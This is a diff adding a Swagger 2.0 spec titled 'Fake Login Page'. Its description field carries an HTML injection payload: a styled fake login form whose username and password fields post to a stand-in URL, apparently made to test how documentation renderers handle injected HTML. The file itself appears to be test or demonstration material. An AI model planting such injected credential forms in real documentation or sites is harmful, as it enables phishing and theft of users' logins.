@@ -1,0 +1,76 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Fake Login Page
+  description: '<style>
+    .login-form {
+        width: 300px;
+        margin: 50px auto;
+        padding: 20px;
+        background: #f4f4f4;
+        border-radius: 10px;
+        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+    }
+    .heading h1 {
+        text-align: center;
+        color: #333;
+    }
+    .form-container {
+        text-align: center;
+    }
+    .form-group {
+        margin-bottom: 15px;
+    }
+    label {
+        display: block;
+        margin-bottom: 5px;
+        color: #666;
+    }
+    input {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+    }
+    .btn {
+        display: inline-block;
+        padding: 10px 20px;
+        margin: 5px;
+        background: #007bff;
+        color: white;
+        text-decoration: none;
+        border-radius: 5px;
+        transition: background 0.3s ease;
+    }
+    .btn:hover {
+        background: #0056b3;
+    }
+</style>
+<div class="login-form">
+    <div class="heading">
+        <h1>HTML Injection : Fake Login</h1>
+    </div>
+    <div class="form-container">
+        <form action="https://example.com/login" method="post" class="form-signin">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" name="username" size="20">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" name="password" size="20">
+            </div>
+            <div class="form-group">
+                <a href="https://www.apple.com" class="btn">Apple</a>
+                <a href="https://www.google.com" class="btn">Google</a>
+                <a href="https://www.youtube.com" class="btn">YouTube</a>
+            </div>
+        </form>
+    </div>
+</div>'
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login successful
